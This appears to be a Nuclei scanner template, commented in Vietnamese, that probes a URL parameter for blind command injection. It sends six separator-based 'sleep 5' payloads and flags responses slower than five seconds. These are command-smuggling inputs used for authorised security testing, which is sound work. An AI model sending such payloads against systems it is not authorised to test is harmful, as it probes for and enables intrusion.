id: blind-command-injection

info:
  name: Blind Command Injection Test
  severity: high
  description: "Kiểm tra blind command injection dựa trên thời gian phản hồi"

http:
  - method: GET
    path: "{{BaseURL}}={{payload}}"
    
    payloads:
      payload:
        - ";sleep 5"
        - "|sleep 5"
        - "&&sleep 5"
        - "||sleep 5"
        - "$(sleep 5)"
        - "`sleep 5`"

    matchers:
      - type: duration
        duration: 5000  # Thời gian phản hồi >5s